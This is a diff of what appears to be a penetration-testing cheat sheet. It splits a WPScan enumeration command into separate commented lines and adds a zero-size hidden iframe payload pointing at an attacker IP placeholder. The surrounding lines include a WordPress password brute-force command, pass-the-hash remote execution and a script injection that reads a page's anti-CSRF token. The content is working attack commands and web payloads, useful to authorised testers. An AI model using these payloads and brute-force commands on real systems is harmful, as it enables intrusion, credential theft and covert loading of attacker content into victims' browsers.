@@ -4233,7 +4233,10 @@ pth-winexe -U domain_here/user_here cmd.exe
 ## WPSCAN
 ```bash
 # scan wordpress
-wpscan --url url_here --enumerate ap,at,cb,dbe
+wpscan --url url_here --enumerate ap # all plugins
+wpscan --url url_here --enumerate at # all themes
+wpscan --url url_here --enumerate cb # config backups
+wpscan --url url_here --enumerate dbe # db exports
 
 # brute force passwords
 wpscan --url url_here -P /path/to/wordlist
@@ -4313,6 +4316,9 @@ sudo python -m SimpleHTTPServer 80
 
 # steal anti-CSRF token from DOM
 <script>document.addEventListener("DOMContentLoaded",()=>alert(csrf.value))</script><link/rel="
+
+# hidden iframe
+<iframe src=http://attacker_IP_here/path/to/file height=”0” width=”0”></iframe>
 ```
 
 
